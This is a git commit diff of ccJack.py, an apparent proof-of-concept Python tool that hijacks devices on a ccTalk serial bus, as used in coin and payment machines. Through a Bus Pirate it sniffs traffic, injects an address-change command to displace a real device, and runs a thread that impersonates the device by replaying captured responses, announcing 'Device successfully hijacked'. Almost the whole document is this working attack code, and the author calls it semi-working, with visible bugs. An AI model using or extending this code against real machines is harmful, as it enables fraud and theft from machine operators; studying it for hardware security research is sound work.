a5b40124e24e823e495635e745fb5392a497b5d5
Baldanos <nicolas@localhost.localdomain>
2012-10-07 18:47:20 +0200

    Semi-working version to keep

--- ccJack.py
+++ ccJack.py
@@ -20,48 +20,81 @@ class ccResponder(threading.Thread):
         self.address = address
         self.responses={}
 
-    def readPacket():
+    def readPacket(self):
         """
         Reads a ccTalk packet and returns it
         """
-        while true:
+        buff=""
+        while True:
+            print "Buffer status"
+            print buff.encode('hex')
             #Read the destination address
-            dst = ser.read(1)
-            length = ser.read(1)
-            while ser.inWaiting()<length+3:
-                time.sleep(0.001)
-            pkt = dst+length+ser.read(length+3)
-            ccPkt = ccTalkMessage(pkt)
-            return ccPkt
+            if len(buff)<2:
+                while ser.inWaiting()<2:
+                    time.sleep(0.001)
+                buff += ser.read(2)
+            length=ord(buff[1])
+            if len(buff)<length+5:
+                while ser.inWaiting()<length+3:
+                    time.sleep(0.001)
+                buff += ser.read(length+3)
+            try:
+                ccPkt = ccTalkMessage(data=buff[:length+5])
+                print "Received : ", ccPkt
+                return ccPkt
+            except:
+                buff=buff[1:]
+                continue
 
-    def setResponse(header,response):
+    def setResponse(self, header,response):
         """
         Changes the data to sent in response to a request
         """
-        self.responses.update({header,response})
+        self.responses.update({header:response})
 
-    def respond(request):
+    def bulkSetResponse(self, responses):
+        """
+        Changes the data to sent in response to a request
+        """
+        self.responses.update(responses)
+
+    def respond(self, request):
         """
         Responds to a request
         """
-        resp = ccTalkMessage(header=0, source=self.address, destination=request.source, data=self.responses[request.header])
-        ser.write(chr(0b00010000+(len(resp)-1)))
-        ser.write(resp)
-        #Clear the packet we sent, since it's a 1 wire bus
-        ser.read(len(resp))
+        if request.payload.header in self.responses.keys():
+            resp = ccTalkMessage(header=0, source=self.address, destination=request.source, payload=self.responses[request.payload.header])
+        else:
+            resp = ccTalkMessage(header=0, source=self.address, destination=request.source)
+        print "Responding : ", resp
+        disableRX()
+        #ser.write(chr(0b00010000+(len(resp.raw())-1)))
+        #ser.write(resp.raw())
+        #ser.flush()
+        # Since the bitbang responds à 0x01 after each byte, clean after the whole data is sent
+        #ser.read(len(resp.raw()))
+        for byte in resp.raw():
+            ser.write(chr(0b00010001))
+            ser.write(byte)
+            ser.flush()
+            ser.read(1)
+            print "Wrote ", byte.encode('hex')
+        enableRX()
     
     def run(self):
         global ser
-        global readLock
         while not self.terminated:
             pkt = self.readPacket()
             if pkt.destination==self.address:
-                #The packet is for the responder
-                respond(pkt)
-                print "Responded to request " + str(request.payload.header)
+                # The packet is for the responder
+                # Wait 10ms to simulate the device
+                time.sleep(0.01)
+                self.respond(pkt)
 
     def stop(self):
         self.terminated = True
+
+
 
 class serialTimerReader(threading.Thread):
     """
@@ -76,19 +109,18 @@ class serialTimerReader(threading.Thread):
         self.times=[]
     
     def run(self):
-        #print "serialTimerReader running"
         global ser
         bytesToRead=0
         while not self.terminated:
             start = time.clock()
-            while ser.inWaiting() == 0:
+            while ser.inWaiting() == 0 and not self.terminated:
                 time.sleep(0.001)
             elapsed = round(time.clock()-start,3)
             # We need at least a 10 miliseconds time frame to start sending
             # We'll take at least 20 miliseconds to wait and send our data 
-            if elapsed > 0.02:
+            if elapsed >= 0.02:
                 self.times.append(elapsed)
-            data = ser.read(ser.inWaiting())
+            self.data = self.data + ser.read(ser.inWaiting())
 
     def stop(self):
         self.terminated = True
@@ -99,10 +131,11 @@ class serialTimerReader(threading.Thread):
     def getTimes(self):
         return self.times
 
-            
 
 def enterBitBang():
-
+    """
+    Enters binary bitbang mode on the bus pirate
+    """
     # Enter bitbang mode
     for i in xrange(20):
         ser.write("\x00")
@@ -112,56 +145,71 @@ def enterBitBang():
 
     # Enter UART mode
     ser.write("\x03")
-
     #Baud rate : 9600
     ser.write(chr(0b01100100))
-
     #Peripherals : power ON / pullup ON
     ser.write(chr(0b01001100))
-
-
-    # Enable UART RX echo
-    ser.write(chr(0b00000010))
-
     # Cleans input buffer
     ser.flushInput()
+    while ser.inWaiting()>0:
+        time.sleep(0.1)
 
 
 def leaveBitBang():
-
-    # Disable UART RX echo
-    ser.write(chr(0b00000011))
-
-
+    """
+    Leave the binary bitbang mode on the bus pirate
+    """
     # Leave UART mode
     ser.write("\x00")
-
     # Leave bitbang mode
     ser.write("\x0f")
 
+def disableRX():
+    """
+    Disable UART RX echo on the bus pirate
+    """
+    ser.write(chr(0b00000011))
+    ser.read(1)
+
+def enableRX():
+    """
+    Enable UART RX echo on the bus pirate
+    """
+    ser.write(chr(0b00000010))
+    ser.read(1)
+
+
+
 def injectMessage(header, data='', source=1, destination=2):
     """
-    Waits for a silence on the ccTalk bus, the sends a packet"
+    Waits for a silence on the ccTalk bus, then sends a packet"
     """
     request = ccTalkMessage(source=source, destination=destination, header=header, payload=data)
     #request.setPayload(header, data)
     bytesToRead=0
     sent=False
-    readLock.acquire()
     while not sent:
         start = time.clock()
         while bytesToRead == 0 and not sent:
             bytesToRead = ser.inWaiting()
             if time.clock()-start >= 0.01:
+                print "Start"
+                disableRX()
                 ser.write(chr(0b00010000+(len(request)-1)))
-                ser.write(request)
+                ser.write(request.raw())
+                ser.flush()
+                ser.read(len(request.raw()))
+                enableRX()
                 sent=True
                 break
-        ser.flushInput()
         bytesToRead=0
     print "[*] Request sent"
-    readLock.release()
 
+def extractResponses(messages):
+    responses = {}
+    for i in range(0,len(messages)):
+        if messages[i].payload.header==0:
+            responses.update({messages[i-1].payload.header, messages[i].payload.data})
 
 if __name__ == '__main__':
 
@@ -180,9 +228,13 @@ if __name__ == '__main__':
     else:
         try:
             if options.busPirate:
-                ser=serial.Serial(options.serPort, 115200, timeout=1)
+                #ser=serial.Serial(options.serPort, 115200, timeout=1)
+                ser=serial.Serial(options.serPort, 115200)
+                enterBitBang()
+                enableRX()
             else:
-                ser=serial.Serial(options.serPort, 9600, timeout=1)
+                #ser=serial.Serial(options.serPort, 9600, timeout=1)
+                ser=serial.Serial(options.serPort, 9600)
         except serial.SerialException, e:
             print e.message
             sys.exit()
@@ -192,64 +244,81 @@ if __name__ == '__main__':
     else:
         outFile = None
 
-    # Inits the bus pirate device if needed
-    if options.busPirate:
-        enterBitBang()
-
     # main loop
+    reader = serialTimerReader()
+    reader.start()
+    print "[*] Serial timer reader running for 5 seconds..."
+
+    time.sleep(5)
+    print "[*] Stopping timer reader..."
+
+    reader.stop()
+    reader.join()
+
+    times = reader.getTimes()
+    
     try:
-        reader = serialTimerReader()
-        reader.start()
-        print "[*]Serial timer reader running for 5 seconds..."
-
-        time.sleep(5)
-        print "[*]Stopping timer reader..."
-
-        reader.stop()
-        reader.join()
-
-        times = reader.getTimes()
 
         if len(times)>0:
+
             print "[*] Time slots found, ready for injection"
 
+            # We instanciate the responder to load the responses
+            responder = ccResponder(int(options.source))
+
+            ccPkts = parseMessages(reader.getData())[1]
+
+            for i in range(len(ccPkts)):
+                if ccPkts[i].payload.header==0:
+                    responder.setResponse(ccPkts[i-1].payload.header, ccPkts[i].getPayload()[1:])
+                    print "Added response to request header " + str(ccPkts[i-1].payload.header)
             
+            responder.setResponse(229, "112233445566778899aabb".decode('hex'))
+
             print "[*] Replacing device @ "+str(options.source)+" to "+str(options.destination)
 
-            time.sleep(1)
-
-            # Check if there is a device on the destination address
-            injectMessage( header=254, data='', source=1, destination=int(options.destination))
+            #print "[*] Checking for device to hijack"
+            #injectMessage( header=254, data='', source=1, destination=int(options.destination))
             #TODO: Add check for device response
 
-            time.sleep(5)
-
             # Send an address change request to the device
+            print "[*] Changing device address to "+str(options.destination)
             injectMessage( header=251, data=chr(int(options.destination)), source=1, destination=int(options.source))
 
-            time.sleep(5)
 
-            # Check if the device address is correctly changed
-            injectMessage( header=254, data='', source=1, destination=int(options.destination))
+            #Totally flush the input buffer before starting replies
+            disableRX()
+            ser.flushInput()
+            while ser.inWaiting()>0:
+                time.sleep(0.1)
+            time.sleep(0.1)
+            enableRX()
 
-            time.sleep(5)
-
-            #TODO: Add check for correct device hijack
-
-            print "[*] Device successfully hijacked"
-
-                    
-            responder = ccResponder(options.destination)
+            print "[*] Device successfully hijacked, starting responder thread"
             responder.start()
 
-            time.sleep(5)
+            while True:
+                #userHeader = int(raw_input('Enter header value to change (q to quit): '))
+                #userData = raw_input('Enter new data (in hex): ').decode('hex')
+                #responder.setResponse(userHeader,userData)
+                time.sleep(1)
+
+        else:
+            print "[-] No time slots found"
 
 
     except Exception, e:
         print e
-        if options.busPirate:
-            leaveBitBang()
 
-        reader.stop()
-        reader.join()
+    #except:
+    #    print "[*] Stopping responder thread"
+    #    responder.stop()
+    #    responder.join()
 
+
+    print "[*] Restoring device @ " + str(options.source)
+    enableRX()
+    injectMessage( header=251, data=chr(int(options.source)), source=1, destination=int(options.destination))
+
+    if options.busPirate:
+        leaveBitBang()
